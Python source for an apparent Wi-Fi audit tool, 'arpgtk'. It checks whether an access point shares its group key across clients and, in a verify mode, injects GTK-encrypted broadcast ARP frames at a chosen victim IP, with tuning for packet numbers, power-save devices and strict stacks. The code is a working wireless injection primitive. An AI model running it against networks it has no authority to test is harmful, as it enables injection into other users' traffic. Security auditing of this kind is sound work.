#!/usr/bin/env python3
"""
arpgtk: audit tool for ARP-over-GTK injection exposure.

Two modes:

  --check-gtk-shared (default)
      Associate twice on two virtual managed interfaces; byte-compare
      the GTK each association receives. Equal => the AP shares one
      GTK across clients => the network is exposed to ARP-over-GTK
      injection. Unequal => the AP randomizes per client and the
      primitive is mitigated upstream.

  --verify --target-ip IP
      Confirms whether a specific victim is exposed right now. Sends
      one CCMP-encrypted from-DS broadcast ARP request under the GTK,
      using a benign 169.254.x.x requestor IP, and watches the managed
      iface for the bridged unicast ARP reply. Reply seen => the
      primitive is viable against this target.

USE ONLY ON NETWORKS YOU OWN OR ARE EXPLICITLY AUTHORIZED TO TEST.

Examples:
    sudo ./arpgtk.py --iface wlan0 --ssid mynet --psk mypass
    sudo ./arpgtk.py --iface wlan0 --ssid mynet --psk mypass \\
        --verify --target-ip 192.168.1.50
"""

from __future__ import annotations

import argparse
import atexit
import ipaddress
import os
import random
import re
import signal
import sys
import threading
import time

__version__ = "1.0.0"


# --- preflight ---------------------------------------------------------------

def preflight() -> None:
    """Check runtime deps before importing scapy/libwifi (cleaner errors)."""
    missing = []
    try:
        import scapy  # noqa: F401
    except ImportError:
        missing.append("scapy")
    try:
        import Crypto  # noqa: F401
    except ImportError:
        missing.append("pycryptodome")
    if missing:
        sys.exit(f"ERROR: install runtime deps first: pip install "
                 f"{' '.join(missing)} (try --break-system-packages on "
                 "Debian/Ubuntu/Kali).")


# --- args --------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="arpgtk",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Audit tool for ARP-over-GTK injection exposure.",
        epilog=__doc__.split("Examples", 1)[-1],
    )
    p.add_argument("--version", action="version",
                   version=f"arpgtk {__version__}")

    g = p.add_argument_group("supplicant / association")
    g.add_argument("--iface", required=True,
                   help="Managed-mode wireless interface to associate on.")
    g.add_argument("--mon-iface",
                   help="Auto-created monitor iface (default: "
                        "<iface>[:12]+'mon'). Only used by --verify.")
    g.add_argument("--chk-iface",
                   help="Auto-created second managed iface for "
                        "--check-gtk-shared (default: <iface>[:12]+'chk').")
    g.add_argument("--ssid", required=True, help="Target SSID.")
    g.add_argument("--key-mgmt", default="WPA-PSK",
                   help="WPA-PSK | SAE | NONE (default WPA-PSK).")
    g.add_argument("--psk",
                   help="PSK / passphrase. Required for WPA-PSK; usable with SAE.")
    g.add_argument("--sae-password",
                   help="SAE password. Alternative to --psk for SAE.")
    g.add_argument("--scan-freq", type=int, default=2412,
                   help="MHz hint for the supplicant scan (default 2412).")
    g.add_argument("--bssid", help="Pin association to a specific BSSID.")
    g.add_argument("--ieee80211w", choices=("0", "1", "2"),
                   help="PMF override: 0=disabled, 1=optional, 2=required.")
    g.add_argument("--wpa-supplicant", default="./wpa_supplicant/wpa_supplicant",
                   help="Path to a wpa_supplicant binary that supports "
                        "GET_GTK / GET tk. Default: ./wpa_supplicant/"
                        "wpa_supplicant (build via ./build.sh).")
    g.add_argument("--timeout", type=float, default=30.0,
                   help="Seconds to wait for key negotiation. Default 30.")
    g.add_argument("--quiet", action="store_true",
                   help="Suppress wpa_supplicant CTRL-EVENT chatter.")
    g.add_argument("--supplicant-debug", action="count", default=0,
                   help="Pass -d / -dd to wpa_supplicant. Repeat for more.")

    g = p.add_argument_group("modes")
    g.add_argument("--verify", action="store_true",
                   help="Live probe-and-reply against --target-ip. Default "
                        "is --check-gtk-shared.")
    g.add_argument("--target-ip",
                   help="Victim IP for --verify. Required when --verify is set.")
    g.add_argument("--target-mac",
                   help="Victim's MAC. By default arpgtk learns the MAC "
                        "from the reply's hwsrc; pass --target-mac to skip "
                        "that step. The asserted MAC is also cross-checked "
                        "against the reply when one arrives.")
    g.add_argument("--probe-src-ip",
                   help="Override the requestor IP in the verify probe. "
                        "Default is a random RFC 3927 link-local address "
                        "(169.254.x.x) so the request leaves no operationally "
                        "meaningful trace on the target. Stricter stacks "
                        "(iOS, recent Android, locked-down embedded devices) "
                        "may silently drop ARP requests with off-subnet psrc "
                        "and not reply. Pass an IP in the target's subnet "
                        "(e.g. the gateway) to elicit a reply from those "
                        "stacks. Cost: a transient (probe-src-ip, our-mac) "
                        "entry on the target.")
    g.add_argument("--pn-offset", type=lambda v: int(v, 0), default=4,
                   help="How many PNs above the AP's last sniffed broadcast "
                        "PN to send the probe at. Default 4. Bump if "
                        "receivers reject the frame as a replay. Doubles as "
                        "a minimum PN when no AP broadcasts are seen during "
                        "the sample window. Accepts hex (0x...).")
    g.add_argument("--pn-sample-window", type=float, default=1.5,
                   help="Seconds to sniff AP broadcasts before injecting "
                        "the probe, used to learn the AP's current PN. "
                        "Default 1.5. If no AP broadcasts arrive in this "
                        "window we fall back to a safe-high default PN.")
    g.add_argument("--probe-count", type=int, default=1,
                   help="Number of probe injections to send. Default 1 "
                        "(single-shot). Bump to e.g. 10 against targets "
                        "in Wi-Fi power-save (iPhones, recent Android) "
                        "where a single frame may land in an RX-off "
                        "window. Each probe uses a unique sequential PN.")
    g.add_argument("--probe-interval", type=float, default=0.1,
                   help="Seconds between successive probe injections. "
                        "Default 0.1. Only relevant when --probe-count > 1. "
                        "Pick a value shorter than the target's typical "
                        "PSM sleep cycle (~100-300ms for phones).")
    g.add_argument("--pcap",
                   help="Path to a pcap file. Frames received on the "
                        "monitor iface during the sample window plus the "
                        "injected probe are written here for offline "
                        "analysis. Useful when --verify reports no reply: "
                        "open in Wireshark with the captured GTK and "
                        "check whether the AP is broadcasting on our "
                        "keyid, whether our frame went out, and whether "
                        "the receiver is MIC-failing.")
    return p.parse_args()


def fatal(msg: str) -> None:
    print(f"ERROR: {msg}", file=sys.stderr)
    sys.exit(1)


# --- the two modes -----------------------------------------------------------

def do_check_gtk_shared(args, *, iface_a: str, chk_iface: str,
                       atexit_state: dict) -> str:
    """Run two parallel associations and byte-compare GTKs."""
    from arpgtk_core.errors import IfaceError, SupplicantError
    from arpgtk_core.iface import (get_iface_mac, setup_managed_vif,
                                   teardown_vif)
    from arpgtk_core.session import GtkSession, SupplicantConfig

    try:
        created = setup_managed_vif(iface_a, chk_iface)
    except IfaceError as e:
        print(f"[!] Could not bring up {chk_iface}: {e}")
        return "inconclusive"
    atexit_state["we_created_chk"] = created

    print(f"[+] Comparison iface: {chk_iface} "
          f"({'auto-created' if created else 'reusing existing'})")

    cfg_a = SupplicantConfig(
        iface=iface_a, ssid=args.ssid, key_mgmt=args.key_mgmt,
        psk=args.psk, sae_password=args.sae_password,
        scan_freq=args.scan_freq, bssid=args.bssid,
        ieee80211w=args.ieee80211w,
    )
    cfg_b = SupplicantConfig(
        iface=chk_iface, ssid=args.ssid, key_mgmt=args.key_mgmt,
        psk=args.psk, sae_password=args.sae_password,
        scan_freq=args.scan_freq, bssid=args.bssid,
        ieee80211w=args.ieee80211w,
    )
    verdict = "inconclusive"
    try:
        with GtkSession(cfg_a, args.wpa_supplicant,
                        debug=args.supplicant_debug,
                        timeout=args.timeout, quiet=True) as sa, \
             GtkSession(cfg_b, args.wpa_supplicant,
                        debug=args.supplicant_debug,
                        timeout=args.timeout, quiet=True) as sb:
            print(f"[+] Iface A ({iface_a})    -> {sa.keys.bssid}")
            print(f"[+] Iface B ({chk_iface}) -> {sb.keys.bssid}")
            print()
            print("================ GTK comparison ================")
            print(f"  Iface A  iface={iface_a:<12}  MAC={get_iface_mac(iface_a)}")
            print(f"           BSSID={sa.keys.bssid}  idx={sa.keys.gtk_idx}")
            print(f"           GTK={sa.keys.gtk_hex}")
            print(f"  Iface B  iface={chk_iface:<12}  MAC={get_iface_mac(chk_iface)}")
            print(f"           BSSID={sb.keys.bssid}  idx={sb.keys.gtk_idx}")
            print(f"           GTK={sb.keys.gtk_hex}")
            print("------------------------------------------------")
            if sa.keys.bssid.lower() != sb.keys.bssid.lower():
                print("  WARNING: A and B associated to different BSSIDs; "
                      "the comparison is not meaningful. Pin --bssid and "
                      "re-run.")
            elif sa.keys.gtk_hex == sb.keys.gtk_hex:
                print("  RESULT:  GTK IS SHARED across clients.")
                print("           Network is exposed to ARP-over-GTK injection.")
                verdict = "shared"
            else:
                print("  RESULT:  GTK IS RANDOMIZED per client.")
                print("           AP appears to implement DGAF Disable / "
                      "per-client GTK. The injection primitive is "
                      "mitigated upstream.")
                verdict = "randomized"
            print("================================================")
    except (SupplicantError, IfaceError) as e:
        print(f"[!] GTK comparison aborted: {e}")
    finally:
        if created:
            teardown_vif(chk_iface)
            atexit_state["we_created_chk"] = False
            print(f"[+] Tore down {chk_iface}")
        else:
            print(f"[+] Leaving pre-existing {chk_iface} alone")

    return verdict


# Safe-high PN fallback: ~1M, enough to clear most session-length AP
# broadcast counters without sniffing. Used if --pn-sample-window
# elapses with no AP broadcasts on our keyid.
_SAFE_HIGH_PN = 0x100000


_MAC_RE = re.compile(r"^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$")


def do_verify(args, *, mon_iface: str, atexit_state: dict) -> int:
    """Single-shot probe-and-reply against --target-ip."""
    if not args.target_ip:
        fatal("--verify requires --target-ip.")
    try:
        ipaddress.ip_address(args.target_ip)
    except ValueError:
        fatal(f"--target-ip {args.target_ip!r} is not a valid IP.")

    asserted_mac = args.target_mac.lower() if args.target_mac else None
    if asserted_mac and not _MAC_RE.match(asserted_mac):
        fatal(f"--target-mac {args.target_mac!r} is not a valid MAC.")

    if args.probe_src_ip:
        try:
            ipaddress.ip_address(args.probe_src_ip)
        except ValueError:
            fatal(f"--probe-src-ip {args.probe_src_ip!r} is not a valid IP.")

    from scapy.all import RadioTap, sendp
    from scapy.layers.l2 import ARP

    from arpgtk_core.errors import IfaceError, SupplicantError
    from arpgtk_core.discovery import ArpReplyWatcher
    from arpgtk_core.frames import (build_dot11_arp_plain,
                                    encrypt_dot11_with_gtk)
    from arpgtk_core.iface import (detect_and_align_channel, get_iface_mac,
                                   setup_monitor, teardown_vif)
    from arpgtk_core.session import GtkSession, SupplicantConfig
    from arpgtk_core.sniffer import (GtkSniffer, LockedPcapWriter,
                                     ReflectionFilter)

    cfg = SupplicantConfig(
        iface=args.iface, ssid=args.ssid, key_mgmt=args.key_mgmt,
        psk=args.psk, sae_password=args.sae_password,
        scan_freq=args.scan_freq, bssid=args.bssid,
        ieee80211w=args.ieee80211w,
    )

    # Set up the monitor iface BEFORE the supplicant runs, so the EAPOL
    # 4-way handshake gets captured into --pcap (Wireshark needs the
    # handshake in the same file to derive PTK/GTK).
    try:
        we_created_mon = setup_monitor(args.iface, mon_iface)
    except IfaceError as e:
        fatal(str(e))
    atexit_state["we_created_mon"] = we_created_mon

    pcap_writer = None
    if args.pcap:
        # link_type=127 = LINKTYPE_IEEE802_11_RADIOTAP.
        pcap_writer = LockedPcapWriter(args.pcap, link_type=127)
        print(f"[+] PCAP: writing to {args.pcap}")

    # Pre-create the sniffer with placeholder ap_mac / gtk_idx; it tees
    # every received frame into the pcap unconditionally, so the EAPOL
    # handshake about to fire on this phy lands in the file. We update
    # the filter values once association completes.
    sniff_state = {"gtk": b"\x00" * 16, "gtk_idx": 0, "ap_pn_seen": 0}
    sniff_lock = threading.Lock()
    sniffer = GtkSniffer(
        mon_iface=mon_iface, ap_mac="ff:ff:ff:ff:ff:ff",
        state=sniff_state, state_lock=sniff_lock,
        reflection=ReflectionFilter(),
        pcap=pcap_writer,
        log=lambda *_: None,
    )
    sniffer.start()

    try:
        with GtkSession(cfg, args.wpa_supplicant,
                        debug=args.supplicant_debug,
                        timeout=args.timeout, quiet=args.quiet) as sess:
            keys = sess.keys
            our_mac = get_iface_mac(args.iface)
            print(f"[+] Associated: BSSID={keys.bssid}, "
                  f"GTK idx={keys.gtk_idx}, our MAC={our_mac}")

            # Now point the sniffer at the actual AP and key id, and
            # discard whatever it counted before association.
            sniffer.update_ap_mac(keys.bssid)
            with sniff_lock:
                sniff_state["gtk_idx"] = keys.gtk_idx
                sniff_state["ap_pn_seen"] = 0

            channel = detect_and_align_channel(args.iface, mon_iface,
                                               log=print)
            print(f"[+] Monitor iface {mon_iface} on channel {channel} "
                  f"({'auto-created' if we_created_mon else 'reusing'}).")

            print(f"[+] Sampling AP broadcast PN on keyid={keys.gtk_idx} "
                  f"for {args.pn_sample_window:.1f}s...")
            time.sleep(args.pn_sample_window)
            with sniff_lock:
                our_keyid_pn = sniff_state["ap_pn_seen"] or None
                pn_by_keyid = dict(sniff_state.get("ap_pn_by_keyid", {}))

            keyid_summary = (
                ", ".join(f"k{k}=0x{v:x}"
                          for k, v in sorted(pn_by_keyid.items()))
                or "none")
            print(f"[+] AP broadcasts by keyid: {keyid_summary} "
                  f"(our gtk_idx={keys.gtk_idx})")

            # Floor against the AP's PN under our keyid AND under any
            # other keyid the sniffer saw. The "any" path is what
            # rescues the run when the AP rotated keys at association
            # time and is currently broadcasting under a keyid our
            # supplicant didn't capture.
            max_any_keyid = max(pn_by_keyid.values(), default=0)
            if our_keyid_pn is not None or max_any_keyid > 0:
                base = max(our_keyid_pn or 0, max_any_keyid)
                probe_pn = base + args.pn_offset
                print(f"[+] Floor: highest AP PN seen = 0x{base:x}; "
                      f"probe PN=0x{probe_pn:x} (offset=0x{args.pn_offset:x}).")
            else:
                probe_pn = max(_SAFE_HIGH_PN, args.pn_offset)
                print(f"[+] No AP broadcasts seen on any keyid; using "
                      f"fallback PN=0x{probe_pn:x} "
                      f"(max of safe-high 0x{_SAFE_HIGH_PN:x} and "
                      f"--pn-offset 0x{args.pn_offset:x}).")

            watcher = ArpReplyWatcher(args.iface, our_mac)
            watcher.start()
            try:
                # Default requestor IP is RFC 3927 link-local: a transient
                # (probe_src, our_mac) entry the target may briefly cache
                # doesn't shadow any real host on the network.
                # --probe-src-ip overrides this for stricter stacks (iOS,
                # recent Android) that drop ARP requests with off-subnet psrc.
                if args.probe_src_ip:
                    probe_src = args.probe_src_ip
                else:
                    probe_src = (f"169.254.{random.randint(1, 254)}."
                                 f"{random.randint(1, 254)}")
                probe = ARP(op=1,
                            hwsrc=our_mac, psrc=probe_src,
                            hwdst="00:00:00:00:00:00",
                            pdst=args.target_ip)
                plain = build_dot11_arp_plain(ap_mac=keys.bssid,
                                              arp_layer=probe)

                if args.probe_count == 1:
                    print(f"[+] Probing {args.target_ip} from {probe_src}...")
                else:
                    print(f"[+] Probing {args.target_ip} from {probe_src} "
                          f"({args.probe_count} probes "
                          f"@ {args.probe_interval:.2f}s, "
                          f"PN=0x{probe_pn:x}+i)...")

                inject_start = time.monotonic()
                for i in range(args.probe_count):
                    frame = encrypt_dot11_with_gtk(
                        plain,
                        gtk=bytes.fromhex(keys.gtk_hex),
                        pn=probe_pn + i,
                        gtk_idx=keys.gtk_idx,
                    )
                    # Wrap with RadioTap so what's transmitted matches
                    # what we save to pcap (the sniffer's RX frames also
                    # have one).
                    tx = RadioTap() / frame
                    sendp(tx, iface=mon_iface, verbose=False)
                    if pcap_writer is not None:
                        pcap_writer.write(tx)
                    if i < args.probe_count - 1:
                        time.sleep(args.probe_interval)

                # Wait up to 2.5s after the last probe for any reply.
                # Look at candidates from inject_start onward so a reply
                # that arrived mid-injection isn't missed.
                reply = None
                deadline = time.monotonic() + 2.5
                while time.monotonic() < deadline:
                    window = time.monotonic() - inject_start
                    matching = [c for c in
                                watcher.candidates_in_window(window)
                                if c.psrc == args.target_ip]
                    if matching:
                        reply = matching[0]
                        break
                    time.sleep(0.05)
                print()
                print("================ Verify result ================")
                if reply is None:
                    print(f"  RESULT:  no reply from {args.target_ip} within 2.5s.")
                    if asserted_mac:
                        # The user asserted ground truth on the target's MAC.
                        # That changes the diagnosis: the most likely cause is
                        # a broken bridged STA-to-attacker reply path, not a
                        # failed primitive. Re-order causes accordingly.
                        print("           You passed --target-mac, so the "
                              "primitive itself may well have worked; the "
                              "victim's reply just isn't reaching us. Likely "
                              "causes, most-likely first:")
                        print("            - target is asleep / in Wi-Fi "
                              "power-save (iPhones, Android with screen "
                              "off). Wake the target and retry.")
                        if not args.probe_src_ip:
                            print("            - target's stack drops ARP "
                                  "requests with off-subnet psrc (iOS, "
                                  "recent Android). Retry with "
                                  "--probe-src-ip <gateway-ip>.")
                        print("            - bridged reply path is dropping "
                              "the victim's unicast ARP reply (host "
                              "firewall on the AP's bridge, broken testbed, "
                              "AP not bridging STA-to-STA);")
                        print("            - GTK is randomized per client; "
                              "receiver MIC fails. Run --check-gtk-shared "
                              "to confirm.")
                        print("            - probe PN below the AP's current "
                              "broadcast PN (try a higher --pn-offset);")
                        print("            - monitor iface on the wrong "
                              "channel (check `iw $mon_iface info`);")
                        print("            - driver silently dropped tx at "
                              "the firmware (try another card).")
                    else:
                        print("           Possible causes:")
                        print("            - GTK is randomized per client; "
                              "receiver MIC fails. Run --check-gtk-shared "
                              "to confirm.")
                        print("            - target is asleep / in Wi-Fi "
                              "power-save (iPhones, Android with screen "
                              "off). Wake the target and retry.")
                        if not args.probe_src_ip:
                            print("            - target's stack drops ARP "
                                  "requests with off-subnet psrc (iOS, "
                                  "recent Android). Retry with "
                                  "--probe-src-ip <gateway-ip>.")
                        print("            - probe PN below the AP's current "
                              "broadcast PN (try a higher --pn-offset);")
                        print("            - monitor iface on the wrong "
                              "channel (check `iw $mon_iface info`);")
                        print("            - driver silently dropped tx at "
                              "the firmware (try another card);")
                        print("            - RF doesn't reach (distance, "
                              "walls, antenna);")
                        print("            - target offline, on a different "
                              "VLAN, or firewalling ARP;")
                        print("            - the bridged reply path is "
                              "dropping the victim's unicast ARP reply "
                              "(rare on real APs, common on stripped-down "
                              "testbeds).")
                    print("================================================")
                    return 2
                if asserted_mac and reply.hwsrc.lower() != asserted_mac:
                    print(f"  RESULT:  {args.target_ip} replied, but with "
                          f"hwsrc={reply.hwsrc} -- you asserted "
                          f"--target-mac={asserted_mac}.")
                    print("           Either the asserted MAC is wrong, "
                          "or another host owns this IP on the network. "
                          "Primitive itself reached *some* host on this IP "
                          "and got a reply.")
                    print("================================================")
                    return 0
                print(f"  RESULT:  {args.target_ip} replied with hwsrc={reply.hwsrc}.")
                if asserted_mac:
                    print("           hwsrc matches --target-mac. "
                          "Primitive viable; target identity confirmed.")
                else:
                    print("           Primitive is viable against this target.")
                print("================================================")
                return 0
            finally:
                watcher.stop()
    except (SupplicantError, IfaceError) as e:
        fatal(str(e))
    finally:
        sniffer.stop()
        if pcap_writer is not None:
            pcap_writer.close()
        if we_created_mon:
            teardown_vif(mon_iface)
            atexit_state["we_created_mon"] = False
            print(f"[+] Tore down {mon_iface}")
        else:
            print(f"[+] Leaving pre-existing {mon_iface} alone")


# --- main --------------------------------------------------------------------

def main() -> int:
    preflight()
    args = parse_args()

    if os.geteuid() != 0:
        fatal("must run as root (wpa_supplicant + monitor injection need it).")

    if not os.path.isfile(args.wpa_supplicant):
        fatal(f"--wpa-supplicant {args.wpa_supplicant!r} does not exist. "
              "Build it first with ./build.sh, or pass --wpa-supplicant "
              "/path/to/your/wpa_supplicant.")

    from arpgtk_core.errors import IfaceError
    from arpgtk_core.iface import iface_exists, teardown_vif, validate_managed_iface
    from arpgtk_core.session import janitor_stale_tmpdirs

    janitor_stale_tmpdirs()

    try:
        validate_managed_iface(args.iface)
    except IfaceError as e:
        fatal(str(e))

    mon_iface = args.mon_iface or (args.iface[:12] + "mon")
    chk_iface = args.chk_iface or (args.iface[:12] + "chk")

    atexit_state = {"we_created_mon": False, "we_created_chk": False}

    def _atexit_cleanup():
        if atexit_state["we_created_mon"] and iface_exists(mon_iface):
            teardown_vif(mon_iface)
        if atexit_state["we_created_chk"] and iface_exists(chk_iface):
            teardown_vif(chk_iface)
    atexit.register(_atexit_cleanup)

    user_cancelled = {"yes": False}

    def _handle(signum, _frame):
        if signum == signal.SIGINT:
            user_cancelled["yes"] = True
        raise KeyboardInterrupt
    for sig in (signal.SIGINT, signal.SIGTERM, signal.SIGHUP):
        signal.signal(sig, _handle)

    try:
        if args.verify:
            return do_verify(args, mon_iface=mon_iface,
                             atexit_state=atexit_state) or 0
        verdict = do_check_gtk_shared(args, iface_a=args.iface,
                                      chk_iface=chk_iface,
                                      atexit_state=atexit_state)
        # Exit code conveys verdict:
        #   0 = shared (vulnerable)
        #   2 = randomized (mitigated)
        #   3 = inconclusive
        return {"shared": 0, "randomized": 2}.get(verdict, 3)
    except KeyboardInterrupt:
        return 130 if user_cancelled["yes"] else 1


if __name__ == "__main__":
    sys.exit(main())
